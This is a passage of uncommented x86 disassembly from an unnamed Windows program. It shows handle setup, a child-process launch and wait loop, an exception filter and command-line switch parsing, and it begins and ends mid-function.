  40abcf:	push   ebx
  40abd0:	push   ebx
  40abd1:	push   edi
  40abd2:	mov    DWORD PTR [ebp-0x54],eax
  40abd5:	call   DWORD PTR ds:0x437360
  40abdb:	mov    edi,eax
  40abdd:	mov    DWORD PTR [ebp-0x5c],edi
  40abe0:	call   DWORD PTR ds:0x437364
  40abe6:	push   ebx
  40abe7:	push   0x1
  40abe9:	push   0x1fffff
  40abee:	lea    ecx,[ebp-0x58]
  40abf1:	push   ecx
  40abf2:	push   eax
  40abf3:	push   eax
  40abf4:	push   eax
  40abf5:	call   DWORD PTR ds:0x437368
  40abfb:	mov    ebx,DWORD PTR ds:0x437304
  40ac01:	test   eax,eax
  40ac03:	mov    eax,DWORD PTR [ebp-0x54]
  40ac06:	je     0x40aeb2
  40ac0c:	cmp    DWORD PTR ds:0x43567c,0x0
  40ac13:	je     0x40aeb2
  40ac19:	test   eax,eax
  40ac1b:	je     0x40aeb9
  40ac21:	test   edi,edi
  40ac23:	je     0x40aeb2
  40ac29:	cmp    DWORD PTR [ebp-0x58],0x0
  40ac2d:	je     0x40aeb2
  40ac33:	mov    esi,DWORD PTR ds:0x43263c
  40ac39:	push   0x9c9c
  40ac3e:	push   0x0
  40ac40:	push   esi
  40ac41:	call   0x410482
  40ac46:	mov    eax,DWORD PTR [ebp-0x58]
  40ac49:	add    esp,0xc
  40ac4c:	mov    DWORD PTR [esi+0x28],eax
  40ac4f:	call   DWORD PTR ds:0x43736c
  40ac55:	mov    ecx,DWORD PTR ds:0x43263c
  40ac5b:	mov    DWORD PTR [ecx+0x8],eax
  40ac5e:	call   DWORD PTR ds:0x437370
  40ac64:	mov    ecx,DWORD PTR ds:0x43263c
  40ac6a:	mov    DWORD PTR [ecx+0xc],eax
  40ac6d:	mov    eax,ds:0x43567c
  40ac72:	mov    DWORD PTR [ecx+0x20],eax
  40ac75:	mov    eax,DWORD PTR [ebp-0x54]
  40ac78:	mov    DWORD PTR [ecx+0x18],eax
  40ac7b:	mov    eax,DWORD PTR [ebp-0x64]
  40ac7e:	mov    DWORD PTR [ecx+0x24],edi
  40ac81:	mov    DWORD PTR [ecx],0x9c9c
  40ac87:	mov    DWORD PTR [ecx+0x4],0x20000
  40ac8e:	mov    DWORD PTR [ecx+0x14],eax
  40ac91:	mov    eax,DWORD PTR [eax]
  40ac93:	mov    eax,DWORD PTR [eax+0xc]
  40ac96:	mov    DWORD PTR [ecx+0x10],eax
  40ac99:	call   DWORD PTR ds:0x43734c
  40ac9f:	cmp    al,0x6
  40aca1:	mov    eax,ds:0x432640
  40aca6:	sbb    cl,cl
  40aca8:	inc    cl
  40acaa:	dec    eax
  40acab:	je     0x40acdb
  40acad:	dec    eax
  40acae:	je     0x40acc2
  40acb0:	dec    eax
  40acb1:	jne    0x40aeaf
  40acb7:	mov    edx,DWORD PTR ds:0x43263c
  40acbd:	and    DWORD PTR [edx+0x2c],eax
  40acc0:	jmp    0x40accf
  40acc2:	mov    edx,DWORD PTR ds:0x43263c
  40acc8:	mov    DWORD PTR [edx+0x2c],0x8
  40accf:	xor    eax,eax
  40acd1:	test   cl,cl
  40acd3:	sete   al
  40acd6:	mov    DWORD PTR [edx+0x30],eax
  40acd9:	jmp    0x40ace9
  40acdb:	mov    edx,DWORD PTR ds:0x43263c
  40ace1:	and    DWORD PTR [edx+0x2c],0x0
  40ace5:	and    DWORD PTR [edx+0x30],0x0
  40ace9:	and    DWORD PTR [edx+0x34],0x0
  40aced:	mov    cl,BYTE PTR ds:0x432635
  40acf3:	xor    eax,eax
  40acf5:	test   cl,cl
  40acf7:	setne  al
  40acfa:	and    DWORD PTR [edx+0x3c],0x0
  40acfe:	xor    ebx,ebx
  40ad00:	inc    ebx
  40ad01:	push   0xffffffff
  40ad03:	push   DWORD PTR ds:0x411068
  40ad09:	mov    DWORD PTR [edx+0x44],ebx
  40ad0c:	dec    eax
  40ad0d:	and    eax,0x10
  40ad10:	or     eax,0x4
  40ad13:	mov    DWORD PTR [edx+0x38],eax
  40ad16:	movzx  eax,cl
  40ad19:	neg    eax
  40ad1b:	sbb    eax,eax
  40ad1d:	and    eax,0x10
  40ad20:	or     eax,ebx
  40ad22:	mov    ebx,DWORD PTR ds:0x43746c
  40ad28:	mov    DWORD PTR [edx+0x4c],eax
  40ad2b:	lea    eax,[edx+0x21ac]
  40ad31:	push   0x38
  40ad33:	push   eax
  40ad34:	call   ebx
  40ad36:	mov    eax,ds:0x437448
  40ad3b:	push   0xffffffff
  40ad3d:	push   DWORD PTR [eax]
  40ad3f:	mov    eax,ds:0x43263c
  40ad44:	add    eax,0x258
  40ad49:	push   0x104
  40ad4e:	push   eax
  40ad4f:	call   ebx
  40ad51:	push   0x12
  40ad53:	pop    ecx
  40ad54:	push   0x48
  40ad56:	lea    eax,[ebp-0x4c]
  40ad59:	push   eax
  40ad5a:	mov    eax,ds:0x43263c
  40ad5f:	mov    esi,0x401db8
  40ad64:	lea    edi,[ebp-0x4c]
  40ad67:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad69:	mov    esi,0x104
  40ad6e:	add    eax,0x460
  40ad73:	push   esi
  40ad74:	push   eax
  40ad75:	call   DWORD PTR ds:0x437488
  40ad7b:	mov    eax,ds:0x43263c
  40ad80:	push   0xffffffff
  40ad82:	push   DWORD PTR ds:0x41106c
  40ad88:	add    eax,0x7a4
  40ad8d:	push   esi
  40ad8e:	push   eax
  40ad8f:	call   ebx
  40ad91:	add    esp,0x40
  40ad94:	mov    ebx,0x436090
  40ad99:	push   DWORD PTR ds:0x432638
  40ad9f:	push   0x401e00
  40ada4:	push   esi
  40ada5:	push   ebx
  40ada6:	call   DWORD PTR ds:0x43748c
  40adac:	push   0x44
  40adae:	pop    edi
  40adaf:	push   edi
  40adb0:	push   0x0
  40adb2:	mov    esi,0x436298
  40adb7:	push   esi
  40adb8:	call   0x410482
  40adbd:	add    esp,0x1c
  40adc0:	xor    eax,eax
  40adc2:	push   0x4362dc
  40adc7:	push   esi
  40adc8:	push   eax
  40adc9:	push   eax
  40adca:	push   0x4000020
  40adcf:	push   0x1
  40add1:	push   eax
  40add2:	push   eax
  40add3:	mov    DWORD PTR ds:0x436298,edi
  40add9:	push   ebx
  40adda:	push   0x435e88
  40addf:	call   DWORD PTR ds:0x437374
  40ade5:	mov    ebx,DWORD PTR ds:0x437304
  40adeb:	test   eax,eax
  40aded:	je     0x40aeac
  40adf3:	push   DWORD PTR ds:0x4362dc
  40adf9:	call   ebx
  40adfb:	push   DWORD PTR ds:0x4362e0
  40ae01:	call   ebx
  40ae03:	mov    esi,DWORD PTR ds:0x4372f8
  40ae09:	mov    BYTE PTR [ebp-0x4d],0x1
  40ae0d:	push   0x4e20
  40ae12:	push   DWORD PTR ds:0x43567c
  40ae18:	call   esi
  40ae1a:	test   eax,eax
  40ae1c:	jne    0x40ae33
  40ae1e:	push   0x1
  40ae20:	push   DWORD PTR [ebp-0x54]
  40ae23:	call   esi
  40ae25:	mov    edi,DWORD PTR [ebp-0x5c]
  40ae28:	test   eax,eax
  40ae2a:	jne    0x40ae81
  40ae2c:	xor    al,al
  40ae2e:	mov    BYTE PTR [ebp-0x4d],al
  40ae31:	jmp    0x40ae84
  40ae33:	mov    edi,DWORD PTR [ebp-0x5c]
  40ae36:	push   0x4e20
  40ae3b:	push   edi
  40ae3c:	call   esi
  40ae3e:	cmp    eax,0x102
  40ae43:	je     0x40ae91
  40ae45:	cmp    eax,0x80
  40ae4a:	je     0x40ae8a
  40ae4c:	push   0x1
  40ae4e:	push   DWORD PTR ds:0x43567c
  40ae54:	call   esi
  40ae56:	test   eax,eax
  40ae58:	je     0x40ae69
  40ae5a:	push   DWORD PTR [ebp-0x54]
  40ae5d:	call   DWORD PTR ds:0x43737c
  40ae63:	mov    BYTE PTR [ebp-0x4d],0x0
  40ae67:	jmp    0x40ae7a
  40ae69:	push   0x1
  40ae6b:	push   DWORD PTR [ebp-0x54]
  40ae6e:	call   esi
  40ae70:	neg    eax
  40ae72:	sbb    al,al
  40ae74:	and    al,BYTE PTR [ebp-0x4d]
  40ae77:	mov    BYTE PTR [ebp-0x4d],al
  40ae7a:	push   edi
  40ae7b:	call   DWORD PTR ds:0x437378
  40ae81:	mov    al,BYTE PTR [ebp-0x4d]
  40ae84:	test   al,al
  40ae86:	jne    0x40ae0d
  40ae88:	jmp    0x40ae91
  40ae8a:	push   edi
  40ae8b:	call   DWORD PTR ds:0x437378
  40ae91:	mov    eax,ds:0x43263c
  40ae96:	mov    al,BYTE PTR [eax+0x9a84]
  40ae9c:	and    al,0x10
  40ae9e:	movzx  eax,al
  40aea1:	neg    eax
  40aea3:	sbb    eax,eax
  40aea5:	not    eax
  40aea7:	and    DWORD PTR [ebp-0x60],eax
  40aeaa:	jmp    0x40aeaf
  40aeac:	mov    edi,DWORD PTR [ebp-0x5c]
  40aeaf:	mov    eax,DWORD PTR [ebp-0x54]
  40aeb2:	test   eax,eax
  40aeb4:	je     0x40aeb9
  40aeb6:	push   eax
  40aeb7:	call   ebx
  40aeb9:	test   edi,edi
  40aebb:	je     0x40aec0
  40aebd:	push   edi
  40aebe:	call   ebx
  40aec0:	cmp    DWORD PTR [ebp-0x58],0x0
  40aec4:	pop    edi
  40aec5:	je     0x40aecc
  40aec7:	push   DWORD PTR [ebp-0x58]
  40aeca:	call   ebx
  40aecc:	mov    eax,ds:0x43567c
  40aed1:	test   eax,eax
  40aed3:	je     0x40aedf
  40aed5:	push   eax
  40aed6:	call   ebx
  40aed8:	and    DWORD PTR ds:0x43567c,0x0
  40aedf:	mov    eax,ds:0x43263c
  40aee4:	test   eax,eax
  40aee6:	je     0x40aef6
  40aee8:	push   eax
  40aee9:	call   DWORD PTR ds:0x437380
  40aeef:	and    DWORD PTR ds:0x43263c,0x0
  40aef6:	mov    eax,ds:0x432638
  40aefb:	test   eax,eax
  40aefd:	je     0x40af09
  40aeff:	push   eax
  40af00:	call   ebx
  40af02:	and    DWORD PTR ds:0x432638,0x0
  40af09:	cmp    BYTE PTR ds:0x411022,0x0
  40af10:	je     0x40af1a
  40af12:	push   0x1
  40af14:	call   DWORD PTR ds:0x4373ec
  40af1a:	mov    eax,DWORD PTR [ebp-0x60]
  40af1d:	pop    esi
  40af1e:	mov    ecx,DWORD PTR [ebp-0x4]
  40af21:	xor    ecx,ebp
  40af23:	pop    ebx
  40af24:	call   0x40fd0b
  40af29:	leave  
  40af2a:	ret    
  40af2b:	push   ebp
  40af2c:	mov    ebp,esp
  40af2e:	mov    ecx,DWORD PTR [ebp+0x8]
  40af31:	mov    eax,DWORD PTR [ecx]
  40af33:	cmp    DWORD PTR [eax],0x80000003
  40af39:	jne    0x40af3f
  40af3b:	xor    eax,eax
  40af3d:	jmp    0x40af6f
  40af3f:	cmp    BYTE PTR ds:0x432636,0x0
  40af46:	jne    0x40af3b
  40af48:	mov    BYTE PTR ds:0x432636,0x1
  40af4f:	mov    DWORD PTR ds:0x41106c,0x402530
  40af59:	mov    DWORD PTR ds:0x411068,0x4024e0
  40af63:	mov    BYTE PTR ds:0x411022,0x0
  40af6a:	call   0x40ab3b
  40af6f:	pop    ebp
  40af70:	ret    0x4
  40af73:	push   ebp
  40af74:	mov    ebp,esp
  40af76:	cmp    BYTE PTR ds:0x421f10,0x0
  40af7d:	push   ebx
  40af7e:	push   edi
  40af7f:	mov    edi,edx
  40af81:	mov    ebx,ecx
  40af83:	jne    0x40af8a
  40af85:	call   0x40518d
  40af8a:	push   esi
  40af8b:	push   0x401e28
  40af90:	call   0x40c2d0
  40af95:	pop    ecx
  40af96:	call   0x40c2b2
  40af9b:	mov    esi,DWORD PTR [ebx]
  40af9d:	push   0x14
  40af9f:	pop    ecx
  40afa0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afa2:	mov    edi,DWORD PTR [ebp+0x8]
  40afa5:	test   edi,edi
  40afa7:	je     0x40afb3
  40afa9:	mov    esi,DWORD PTR [ebx+0x4]
  40afac:	mov    ecx,0xb3
  40afb1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afb3:	call   0x40a9aa
  40afb8:	pop    esi
  40afb9:	test   al,al
  40afbb:	jne    0x40afc5
  40afbd:	push   ebx
  40afbe:	call   0x40af2b
  40afc3:	jmp    0x40afd0
  40afc5:	xor    eax,eax
  40afc7:	cmp    BYTE PTR ds:0x432636,al
  40afcd:	sete   al
  40afd0:	pop    edi
  40afd1:	pop    ebx
  40afd2:	pop    ebp
  40afd3:	ret    0x4
  40afd6:	push   0x558
  40afdb:	push   0x4104e8
  40afe0:	call   0x4103c0
  40afe5:	mov    edi,DWORD PTR [ebp+0xc]
  40afe8:	mov    DWORD PTR [ebp-0x27c],edi
  40afee:	push   0x1
  40aff0:	call   DWORD PTR ds:0x437384
  40aff6:	xor    ebx,ebx
  40aff8:	mov    DWORD PTR [ebp-0x4],ebx
  40affb:	push   0x401e80
  40b000:	push   0x2
  40b002:	pop    eax
  40b003:	push   eax
  40b004:	call   DWORD PTR ds:0x437490
  40b00a:	pop    ecx
  40b00b:	pop    ecx
  40b00c:	mov    esi,DWORD PTR ds:0x43741c
  40b012:	call   esi
  40b014:	lea    ecx,[eax+0x20]
  40b017:	call   0x40c1b8
  40b01c:	mov    ds:0x432644,al
  40b021:	call   esi
  40b023:	lea    ecx,[eax+0x40]
  40b026:	call   0x40c1b8
  40b02b:	mov    ds:0x432637,al
  40b030:	push   0x40a9a9
  40b035:	call   DWORD PTR ds:0x437494
  40b03b:	pop    ecx
  40b03c:	mov    DWORD PTR ds:0x435668,0xc
  40b046:	mov    DWORD PTR ds:0x43566c,ebx
  40b04c:	inc    ebx
  40b04d:	mov    DWORD PTR ds:0x435670,ebx
  40b053:	call   0x40aae8
  40b058:	mov    DWORD PTR ds:0x432640,0x2
  40b062:	mov    esi,ebx
  40b064:	mov    ebx,DWORD PTR [ebp+0x8]
  40b067:	mov    DWORD PTR [ebp-0x278],esi
  40b06d:	cmp    esi,ebx
  40b06f:	jge    0x40b162
  40b075:	lea    edi,[edi+esi*4]
  40b078:	mov    ecx,DWORD PTR [edi]
  40b07a:	movzx  eax,WORD PTR [ecx]
  40b07d:	cmp    eax,0x2d
  40b080:	je     0x40b08b
  40b082:	cmp    eax,0x2f
  40b085:	jne    0x40b156
  40b08b:	push   0x401e88
  40b090:	lea    eax,[ecx+0x2]
  40b093:	push   eax
  40b094:	call   DWORD PTR ds:0x437548
  40b09a:	pop    ecx
  40b09b:	pop    ecx
  40b09c:	test   eax,eax
  40b09e:	jne    0x40b0aa
  40b0a0:	mov    ds:0x432640,eax
  40b0a5:	jmp    0x40b131
  40b0aa:	push   0x401eac
  40b0af:	mov    eax,DWORD PTR [edi]
  40b0b1:	add    eax,0x2
  40b0b4:	push   eax
  40b0b5:	call   DWORD PTR ds:0x437548
  40b0bb:	pop    ecx
  40b0bc:	pop    ecx
  40b0bd:	test   eax,eax
  40b0bf:	jne    0x40b0cd
  40b0c1:	mov    DWORD PTR ds:0x432640,0x1
  40b0cb:	jmp    0x40b131
  40b0cd:	push   0x401ed4
  40b0d2:	mov    eax,DWORD PTR [edi]
  40b0d4:	add    eax,0x2
  40b0d7:	push   eax
  40b0d8:	call   DWORD PTR ds:0x437548
  40b0de:	pop    ecx
  40b0df:	pop    ecx
  40b0e0:	test   eax,eax
  40b0e2:	jne    0x40b0f0
  40b0e4:	mov    DWORD PTR ds:0x432640,0x2
  40b0ee:	jmp    0x40b131
  40b0f0:	push   0x401ef8
  40b0f5:	mov    eax,DWORD PTR [edi]
  40b0f7:	add    eax,0x2
  40b0fa:	push   eax
  40b0fb:	call   DWORD PTR ds:0x437548
  40b101:	pop    ecx
  40b102:	pop    ecx
  40b103:	test   eax,eax
  40b105:	jne    0x40b113
  40b107:	mov    DWORD PTR ds:0x432640,0x3
  40b111:	jmp    0x40b131
  40b113:	push   0x401f1c
  40b118:	mov    eax,DWORD PTR [edi]
  40b11a:	add    eax,0x2
  40b11d:	push   eax
  40b11e:	call   DWORD PTR ds:0x437548
  40b124:	pop    ecx
  40b125:	pop    ecx
  40b126:	test   eax,eax
  40b128:	jne    0x40b156
  40b12a:	mov    BYTE PTR ds:0x432634,0x1
  40b131:	mov    eax,ebx
  40b133:	sub    eax,esi
  40b135:	lea    eax,[eax*4-0x4]
  40b13c:	push   eax
  40b13d:	lea    eax,[edi+0x4]
  40b140:	push   eax
  40b141:	push   edi
  40b142:	call   DWORD PTR ds:0x437444
  40b148:	add    esp,0xc
  40b14b:	dec    ebx
  40b14c:	dec    esi
  40b14d:	mov    DWORD PTR [ebp-0x278],esi
  40b153:	mov    DWORD PTR [ebp+0x8],ebx
  40b156:	inc    esi
  40b157:	mov    edi,DWORD PTR [ebp-0x27c]
  40b15d:	jmp    0x40b067
  40b162:	cmp    DWORD PTR ds:0x432640,0x3
  40b169:	jne    0x40b18b
  40b16b:	call   0x40a9d2
  40b170:	xor    esi,esi
  40b172:	test   al,al
  40b174:	jne    0x40b18d
  40b176:	push   0x401f40
  40b17b:	push   0xfae
  40b180:	push   esi
  40b181:	call   0x405021
  40b186:	add    esp,0xc
  40b189:	jmp    0x40b18d
  40b18b:	xor    esi,esi
  40b18d:	call   0x40a9aa
  40b192:	test   al,al
  40b194:	jne    0x40b1a1
  40b196:	push   0x40af2b
  40b19b:	call   DWORD PTR ds:0x437388
  40b1a1:	cmp    BYTE PTR ds:0x432634,0x0
  40b1a8:	je     0x40b1b2
  40b1aa:	xor    eax,eax
  40b1ac:	mov    ds:0x0,ax
  40b1b2:	mov    eax,esi
  40b1b4:	mov    DWORD PTR [ebp-0x280],eax
  40b1ba:	cmp    eax,0x100
  40b1bf:	jae    0x40b1cb
  40b1c1:	mov    DWORD PTR [eax*4+0x431f40],esi
  40b1c8:	inc    eax
  40b1c9:	jmp    0x40b1b4
  40b1cb:	cmp    DWORD PTR ds:0x431f18,0x0
  40b1d2:	jne    0x40b258
  40b1d8:	mov    eax,ds:0x437448
  40b1dd:	mov    esi,DWORD PTR [eax]
  40b1df:	push   0x20
  40b1e1:	push   esi
  40b1e2:	call   DWORD PTR ds:0x437540
  40b1e8:	pop    ecx
  40b1e9:	pop    ecx
  40b1ea:	test   eax,eax
  40b1ec:	je     0x40b24c
  40b1ee:	mov    ebx,esi
  40b1f0:	lea    ecx,[ebx+0x2]
  40b1f3:	xor    edx,edx
  40b1f5:	push   0x2
  40b1f7:	pop    edi
  40b1f8:	mov    ax,WORD PTR [ebx]
  40b1fb:	add    ebx,edi
  40b1fd:	cmp    ax,dx
  40b200:	jne    0x40b1f8
  40b202:	sub    ebx,ecx
  40b204:	sar    ebx,1
  40b206:	add    ebx,0x3
  40b209:	xor    ecx,ecx
  40b20b:	mov    eax,ebx
  40b20d:	mul    edi
  40b20f:	seto   cl
  40b212:	neg    ecx
  40b214:	or     ecx,eax
  40b216:	call   0x40a2fb
  40b21b:	mov    edi,eax
  40b21d:	push   0x401098
  40b222:	push   ebx
  40b223:	push   edi
  40b224:	call   DWORD PTR ds:0x4373d0
  40b22a:	push   esi
  40b22b:	push   ebx
  40b22c:	push   edi
  40b22d:	mov    esi,DWORD PTR ds:0x4373d4
  40b233:	call   esi
  40b235:	push   0x401098
  40b23a:	push   ebx
  40b23b:	push   edi
  40b23c:	call   esi
  40b23e:	add    esp,0x24
  40b241:	mov    esi,edi
  40b243:	mov    ebx,DWORD PTR [ebp+0x8]
  40b246:	mov    edi,DWORD PTR [ebp-0x27c]
  40b24c:	mov    ecx,esi
  40b24e:	call   0x40dd18
  40b253:	mov    ds:0x431f18,eax
  40b258:	push   0x40bf56
  40b25d:	push   0x2
  40b25f:	pop    eax
  40b260:	push   eax
  40b261:	mov    esi,DWORD PTR ds:0x437498
  40b267:	call   esi
  40b269:	push   0x40bf56
  40b26e:	push   0xf
  40b270:	call   esi
  40b272:	add    esp,0xc
  40b275:	mov    edx,edi
  40b277:	mov    ecx,ebx
  40b279:	call   0x40b55c
  40b27e:	mov    esi,eax
  40b280:	call   0x40c006
  40b285:	cmp    BYTE PTR ds:0x411020,0x0
  40b28c:	jne    0x40b291
  40b28e:	xor    esi,esi
  40b290:	inc    esi
  40b291:	push   esi
  40b292:	call   DWORD PTR ds:0x4373ec
  40b298:	lea    eax,[ebp-0x568]
  40b29e:	push   eax
  40b29f:	lea    edx,[ebp-0x274]
  40b2a5:	mov    ecx,DWORD PTR [ebp-0x14]
  40b2a8:	call   0x40af73
  40b2ad:	ret    
  40b2ae:	mov    esp,DWORD PTR [ebp-0x18]
  40b2b1:	push   DWORD PTR [ebp-0x268]
  40b2b7:	push   DWORD PTR [ebp-0x270]
  40b2bd:	push   DWORD PTR [ebp-0x274]
  40b2c3:	push   0x401fa0
  40b2c8:	call   0x40c2d0
  40b2cd:	add    esp,0x10
  40b2d0:	push   0x1c
  40b2d2:	lea    eax,[ebp-0x29c]
  40b2d8:	push   eax
  40b2d9:	push   DWORD PTR [ebp-0x268]
  40b2df:	call   DWORD PTR ds:0x43738c
  40b2e5:	test   eax,eax
  40b2e7:	je     0x40b31f
  40b2e9:	push   0x104
  40b2ee:	lea    eax,[ebp-0x224]
  40b2f4:	push   eax
  40b2f5:	push   DWORD PTR [ebp-0x298]
  40b2fb:	call   DWORD PTR ds:0x437390
  40b301:	test   eax,eax
  40b303:	je     0x40b31f
  40b305:	lea    eax,[ebp-0x224]
  40b30b:	push   eax
  40b30c:	push   DWORD PTR [ebp-0x298]
  40b312:	push   0x40209c
  40b317:	call   0x40c2d0
  40b31c:	add    esp,0xc
  40b31f:	mov    edi,DWORD PTR [ebp-0x264]
  40b325:	push   edi
  40b326:	push   0x4020b8
  40b32b:	call   0x40c2d0
  40b330:	pop    ecx
  40b331:	pop    ecx
  40b332:	xor    esi,esi
  40b334:	test   edi,edi
  40b336:	je     0x40b352
  40b338:	push   DWORD PTR [ebp+esi*4-0x260]
  40b33f:	push   esi
  40b340:	push   0x402100
  40b345:	call   0x40c2d0
  40b34a:	add    esp,0xc
  40b34d:	inc    esi
  40b34e:	cmp    esi,edi
  40b350:	jb     0x40b338
  40b352:	push   DWORD PTR [ebp-0x550]
  40b358:	push   DWORD PTR [ebp-0x55c]
  40b35e:	push   DWORD PTR [ebp-0x554]
  40b364:	push   DWORD PTR [ebp-0x560]
  40b36a:	push   DWORD PTR [ebp-0x558]
  40b370:	push   DWORD PTR [ebp-0x564]
  40b376:	push   DWORD PTR [ebp-0x4dc]
  40b37c:	push   DWORD PTR [ebp-0x4d8]
  40b382:	push   DWORD PTR [ebp-0x4d4]
  40b388:	push   DWORD PTR [ebp-0x4a0]
  40b38e:	push   DWORD PTR [ebp-0x4d0]
  40b394:	push   DWORD PTR [ebp-0x4ac]
  40b39a:	push   DWORD PTR [ebp-0x4a8]
  40b3a0:	push   DWORD PTR [ebp-0x4b0]
  40b3a6:	push   DWORD PTR [ebp-0x4cc]
  40b3ac:	push   DWORD PTR [ebp-0x4c0]
  40b3b2:	push   DWORD PTR [ebp-0x4c8]
  40b3b8:	push   DWORD PTR [ebp-0x4bc]
  40b3be:	push   DWORD PTR [ebp-0x4b4]
  40b3c4:	push   DWORD PTR [ebp-0x4c4]
  40b3ca:	push   DWORD PTR [ebp-0x4a4]
  40b3d0:	push   DWORD PTR [ebp-0x4b8]
  40b3d6:	push   0x402148
  40b3db:	call   0x40c2d0
  40b3e0:	add    esp,0x5c
  40b3e3:	call   0x40c2b2
  40b3e8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40b3ef:	mov    eax,0x40e
  40b3f4:	call   0x410408
  40b3f9:	ret    
  40b3fa:	push   ebx
  40b3fb:	push   esi
  40b3fc:	push   edi
  40b3fd:	mov    ecx,0x4023b0
  40b402:	call   0x40dd18
  40b407:	mov    ebx,0x4023b8
  40b40c:	mov    ecx,ebx
  40b40e:	mov    esi,eax
  40b410:	call   0x40dd18
  40b415:	xor    edi,edi
  40b417:	push   edi
  40b418:	mov    edx,eax
  40b41a:	mov    ecx,esi
  40b41c:	call   0x4030cf
  40b421:	mov    ecx,0x4023c0
  40b426:	call   0x40dd18
  40b42b:	mov    ecx,ebx
  40b42d:	mov    esi,eax
  40b42f:	call   0x40dd18
  40b434:	push   edi
  40b435:	mov    edx,eax
  40b437:	mov    ecx,esi
  40b439:	call   0x4030cf
  40b43e:	mov    ecx,0x4023c8
  40b443:	call   0x40dd18
  40b448:	mov    ecx,ebx
  40b44a:	mov    esi,eax
  40b44c:	call   0x40dd18
  40b451:	push   edi
  40b452:	mov    edx,eax
  40b454:	mov    ecx,esi
  40b456:	call   0x4030cf
  40b45b:	mov    ecx,0x4023d0
  40b460:	call   0x40dd18
  40b465:	mov    ecx,0x4023d8
  40b46a:	mov    esi,eax
  40b46c:	call   0x40dd18
  40b471:	push   edi
  40b472:	mov    edx,eax
  40b474:	mov    ecx,esi
  40b476:	call   0x4030cf
  40b47b:	mov    ecx,0x4023e0
  40b480:	call   0x40dd18
  40b485:	mov    ecx,0x4023e8
  40b48a:	mov    esi,eax
  40b48c:	call   0x40dd18
  40b491:	push   edi
  40b492:	mov    edx,eax
  40b494:	mov    ecx,esi
  40b496:	call   0x4030cf
  40b49b:	mov    ecx,0x4023f0
  40b4a0:	call   0x40dd18
  40b4a5:	mov    ecx,0x401628
  40b4aa:	mov    esi,eax
  40b4ac:	call   0x40dd18
  40b4b1:	push   0x2
  40b4b3:	mov    edx,eax
  40b4b5:	mov    ecx,esi
  40b4b7:	call   0x4030cf
  40b4bc:	mov    ecx,0x402408
  40b4c1:	call   0x40dd18
  40b4c6:	mov    ecx,DWORD PTR ds:0x431f18
  40b4cc:	mov    esi,eax
  40b4ce:	call   0x40dd18
  40b4d3:	push   0x4c
  40b4d5:	mov    edx,eax
  40b4d7:	mov    ecx,esi
  40b4d9:	call   0x4030cf
  40b4de:	mov    eax,ds:0x401284
  40b4e3:	test   eax,eax
  40b4e5:	je     0x40b558
  40b4e7:	mov    ebx,DWORD PTR ds:0x4373d0
  40b4ed:	mov    esi,edi
  40b4ef:	mov    ecx,eax
  40b4f1:	call   0x40dd18
  40b4f6:	mov    esi,DWORD PTR [esi+0x4011b4]
  40b4fc:	mov    ds:0x4216e8,eax
  40b501:	push   DWORD PTR [esi]
  40b503:	push   0x400
  40b508:	push   0x4216f0
  40b50d:	call   ebx
  40b50f:	add    esp,0xc
  40b512:	call   0x402974
  40b517:	add    esi,0x4
  40b51a:	jmp    0x40b534
  40b51c:	push   eax
  40b51d:	push   0x400
  40b522:	push   0x4216f0
  40b527:	call   ebx
  40b529:	add    esp,0xc
  40b52c:	call   0x402787
  40b531:	lea    esi,[esi+0x4]
  40b534:	mov    eax,DWORD PTR [esi]
  40b536:	test   eax,eax
  40b538:	jne    0x40b51c
  40b53a:	test   edi,edi
  40b53c:	jne    0x40b543
  40b53e:	call   0x402d50
  40b543:	call   0x402e85
  40b548:	inc    edi
  40b549:	mov    esi,edi
  40b54b:	shl    esi,0x2
  40b54e:	mov    eax,DWORD PTR [esi+0x401284]
  40b554:	test   eax,eax
  40b556:	jne    0x40b4ef
  40b558:	pop    edi
  40b559:	pop    esi
  40b55a:	pop    ebx
  40b55b:	ret    
  40b55c:	push   ebp
  40b55d:	mov    ebp,esp
  40b55f:	sub    esp,0x21c
  40b565:	mov    eax,ds:0x411018
  40b56a:	xor    eax,ebp
  40b56c:	mov    DWORD PTR [ebp-0x4],eax
  40b56f:	push   ebx
  40b570:	push   esi
  40b571:	push   edi
  40b572:	mov    ebx,ecx
  40b574:	xor    edi,edi
  40b576:	mov    ecx,0x402414
  40b57b:	mov    DWORD PTR [ebp-0x214],edx
  40b581:	mov    DWORD PTR [ebp-0x210],edi
  40b587:	mov    DWORD PTR ds:0x432424,edi
  40b58d:	call   0x40dd18
  40b592:	push   edi
  40b593:	push   edi
  40b594:	mov    esi,eax
  40b596:	call   DWORD PTR ds:0x43749c
  40b59c:	pop    ecx
  40b59d:	pop    ecx
  40b59e:	push   0x42
  40b5a0:	mov    edx,eax
  40b5a2:	mov    ecx,esi
  40b5a4:	mov    DWORD PTR [ebp-0x218],eax
  40b5aa:	call   0x4030cf
  40b5af:	push   0x402424
  40b5b4:	lea    eax,[ebp-0x210]
  40b5ba:	push   edi
  40b5bb:	push   eax
  40b5bc:	call   DWORD PTR ds:0x437400
  40b5c2:	mov    edi,DWORD PTR [ebp-0x210]
  40b5c8:	add    esp,0xc
  40b5cb:	test   edi,edi
  40b5cd:	je     0x40b5fd
  40b5cf:	mov    ecx,0x41102c
  40b5d4:	xor    esi,esi
  40b5d6:	lea    edx,[ecx+0x2]
  40b5d9:	mov    ax,WORD PTR [ecx]
  40b5dc:	add    ecx,0x2
  40b5df:	cmp    ax,si
  40b5e2:	jne    0x40b5d9
  40b5e4:	sub    ecx,edx
  40b5e6:	sar    ecx,1
  40b5e8:	push   0xffffffff
  40b5ea:	push   edi
  40b5eb:	lea    eax,[ecx-0x9]
  40b5ee:	push   eax
  40b5ef:	push   0x411040
  40b5f4:	call   DWORD PTR ds:0x43746c
  40b5fa:	add    esp,0x10
  40b5fd:	push   0x6
  40b5ff:	mov    ecx,0x411040
  40b604:	mov    BYTE PTR ds:0x4114bd,0x1
  40b60b:	call   0x40dd18
  40b610:	mov    ecx,0x402424
  40b615:	mov    esi,eax
  40b617:	call   0x40dd18
  40b61c:	mov    edx,esi
  40b61e:	mov    ecx,eax
  40b620:	call   0x4030cf
  40b625:	test   edi,edi
  40b627:	je     0x40b63c
  40b629:	movzx  ecx,WORD PTR [edi]
  40b62c:	test   cx,cx
  40b62f:	je     0x40b63c
  40b631:	mov    dl,0x1
  40b633:	call   0x40bd70
  40b638:	inc    edi
  40b639:	inc    edi
  40b63a:	jne    0x40b629
